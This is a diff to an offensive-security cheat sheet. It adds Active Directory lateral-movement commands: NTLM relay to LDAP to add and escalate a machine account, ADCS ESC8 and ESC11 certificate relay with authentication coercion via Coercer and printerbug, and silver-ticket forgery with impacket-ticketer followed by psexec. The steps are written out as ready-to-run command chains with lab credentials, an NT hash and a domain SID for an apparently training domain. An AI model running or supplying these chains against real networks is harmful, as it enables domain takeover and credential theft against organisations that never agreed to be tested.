@@ -57,6 +57,8 @@
     - [AD](#ad)
 - [Lateral Movement](#lateral-movement)
   - [NTLM Relay](#ntlm-relay)
+    - [ESC 8](#esc-8)
+    - [ESC11](#esc11)
   - [Inveigh](#inveigh)
   - [PsExec](#psexec)
   - [winRM](#winrm)
@@ -783,7 +785,52 @@ impacket-ntlmrelayx -smb2support -tf relayTargets.txt -c
 
 # socks
 impacket-ntlmrelayx -smb2support -tf relayTargets.txt -socks
+
+# add computer
+impacket-ntlmrelayx -t ldap://172.16.119.3 -smb2support --no-da --no-acl --add-computer 'plaintext$'
+# PC account escalate
+impacket-ntlmrelayx -t ldap://172.16.117.3 -smb2support --escalate-user 'plaintext$' --no-dump -debug
 ```
+
+### ESC 8
+```bash
+# HTTP Endpoint
+curl -I http://172.16.117.3/certsrv/
+
+# Relay
+impacket-ntlmrelayx -t http://172.16.117.3/certsrv/certfnsh.asp -smb2support --adcs --template "Machine"
+# Authentication Coercion
+Coercer scan -t 172.16.119.70 -u 'plaintext$' -p 'MTXr3(GW)lnljOj' -d INLANEFREIGHT.LOCAL -v
+python3 printerbug.py inlanefreight/plaintext$:'MTXr3(GW)lnljOj'@172.16.119.70 <My_IP>
+# pfx
+
+echo -n "MIIRPQIBAzCCEPcGCSqGSIb3DQEHAaCCEOgEghDkMIIQ4DCCBxcGCSqGSIb3DQEHBqCCBwgwggcEAgEAMI<SNIP>U6EWbi/ttH4BAjUKtJ9ygRfRg==" | base64 -d > ws01.pfx
+```
+```bash
+certipy relay -target "http://172.16.119.3" -template Machinene
+
+Coercer scan -t 172.16.119.70 -u 'plaintext$' -p 'MTXr3(GW)lnljOj' -d INLANEFREIGHT.LOCAL -v
+
+certipy auth -pfx backup01.pfx -dc-ip 172.16.119.3
+```
+Silver Ticket 
+```bash
+impacket-lookupsid 'INLANEFREIGHT.LOCAL\backup01$'@172.16.119.3 -hashes :11d2b884b8b3383ace4a68b8e1d23a8f
+impacket-ticketer -nthash 11d2b884b8b3383ace4a68b8e1d23a8f -domain-sid S-1-5-21-1207890233-375443991-2397730614 -domain inlanefreight.local -spn cifs/backup01.inlanefreight.local Administrator
+
+# vim /etc/hosts to backup01.inlanefreight.local
+KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass backup01.inlanefreight.local
+```
+
+### ESC11
+```bash
+certipy relay -target "rpc://172.16.119.3" -ca "INLANEFREIGHT-DC01-CA"
+
+Coercer scan -t 172.16.119.70 -u 'plaintext$' -p 'MTXr3(GW)lnljOj' -d INLANEFREIGHT.LOCAL -v
+
+certipy auth -pfx backup01.pfx -dc-ip 172.16.119.3
+```
+
 ## Inveigh
 ```powershell
 wget https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1
@@ -1554,6 +1601,10 @@ ip route
 listener_add --addr 0.0.0.0:8888 --to 127.0.0.1:80 --tcp
 listener_add --addr 0.0.0.0:2345 --to 127.0.0.1:80 --tcp
 listener_list
+
+# delete int
+sudo ip link set dev ligolo down
+sudo ip link delete ligolo
 ```
 
 ## SMB
